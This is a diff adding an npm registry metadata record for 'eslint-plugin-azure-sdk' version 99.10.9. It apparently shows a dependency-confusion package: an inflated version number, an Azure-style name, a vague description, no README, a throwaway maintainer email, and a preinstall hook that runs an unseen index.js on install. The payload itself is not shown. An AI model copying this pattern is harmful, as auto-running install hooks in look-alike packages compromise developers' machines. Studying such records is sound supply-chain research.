@@ -1,0 +1,62 @@
+{
+    "_id": "eslint-plugin-azure-sdk",
+    "name": "eslint-plugin-azure-sdk",
+    "dist-tags": {
+        "latest": "99.10.9"
+    },
+    "versions": {
+        "99.10.9": {
+            "name": "eslint-plugin-azure-sdk",
+            "version": "99.10.9",
+            "description": "azure package",
+            "main": "index.js",
+            "scripts": {
+                "test": "echo 'error no test specified' && exit 1",
+                "preinstall": "node index.js"
+            },
+            "author": "",
+            "License": "ISC",
+            "_id": "eslint-plugin-azure-sdk@99.10.9",
+            "_nodeVersion": "14.16.1",
+            "_npmVersion": "6.14.11",
+            "dist": {
+                "integrity": "sha512-CWFYrHNacM0qEYny1K4pVFkWVohsdsSICy/GybjgxnEiM69udw6D9Oe0TlYj7VEYe5qsedXFSJFCBHdabIRNbw==",
+                "shasum": "76faa29510422fec0763c9a88f10f313a2a71b43",
+                "tarball": "https://registry.npmjs.org/eslint-plugin-azure-sdk/-/eslint-plugin-azure-sdk-99.10.9.tgz",
+                "fileCount": 2,
+                "unpackedSize": 5072,
+                "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v4.10.10\r\nComment: https://openpgpjs.org\r\n\r\nwsFzBAEBCAAGBQJiNcvgACEJED1NWxICdlZqFiEECWMYAoorWMhJKdjhPU1b\r\nEgJ2VmorIQ/8DwqAljseaYHRcNFGhYOKKQe50FsqLOg5AsBTdrjhfe5Z+XdY\r\nIPuXKbCW+Xl+meLyg5HQVUWBKIz9PtJDd7b6m6smg+g+kxf7ISVBO/BUtTYC\r\nVlJhTDDX9yN6z0vwhaHamuprVH1J9v2qSbTelWRfaBjYrNRy4FltDkmFXC7l\r\niDS4dMOECZ2ZePqZHiqD/l/QxJBHift3VNeO98UMAw/0a2WFNptilUxkoXmj\r\nqC1f/rgwrDdflnLeBCN5GpSVx7wDwOhAbCm39xk29S2HB27sj61EukspzL9+\r\nJ1OiVs1qkC4KjBj5Gjf8kUDrKbFLC6S/TfIr91LWLhRfY7PDWM39PNQNkPxc\r\n5LBwiXaQORDZIhHcoFl+1hGWOzQGvano1n0Romm1OBnRl5f6AJeSccGfKXfj\r\n32ohr2HFUAK9WIovRELGq9DgL7Ee6eo1CUMTYka8HZGVIkjVPV9KLWc9YDu9\r\ny2Ng1FZrNfbHSO8Cqqy4bs+xdXAxccHMS0lSkaz97Sx9BPkfaI5lRYJhm2i9\r\nHA/WnOitMjwFiwYW5UloYr/y8VFYnyRObbhxP5st2F4lleFiSjhhZ3deHYCg\r\nP0VTOibUPug/PmuwWXxC79WwJSWbjqGTX1P+MJjD+Z+mmnXU5e90+MBheNjE\r\n9OAOmOcG0UDYKg1FrkE+U+ZOPkndofiQJ7M=\r\n=7r+8\r\n-----END PGP SIGNATURE-----\r\n"
+            },
+            "_npmUser": {
+                "name": "eg4n4xjy",
+                "email": "eg4n4xjy@rt11.ml"
+            },
+            "directories": {},
+            "maintainers": [
+                {
+                    "name": "eg4n4xjy",
+                    "email": "eg4n4xjy@rt11.ml"
+                }
+            ],
+            "_npmOperationalInternal": {
+                "host": "s3://npm-registry-packages",
+                "tmp": "tmp/eslint-plugin-azure-sdk_99.10.9_1647692768044_0.5412159525871638"
+            },
+            "_hasShrinkwrap": false
+        }
+    },
+    "time": {
+        "created": "2022-03-19T12:26:08.043Z",
+        "99.10.9": "2022-03-19T12:26:08.509Z",
+        "modified": "2022-03-19T12:26:08.626Z"
+    },
+    "maintainers": [
+        {
+            "name": "eg4n4xjy",
+            "email": "eg4n4xjy@rt11.ml"
+        }
+    ],
+    "description": "azure package",
+    "readme": "ERROR: No README data found!",
+    "readmeFilename": ""
+}
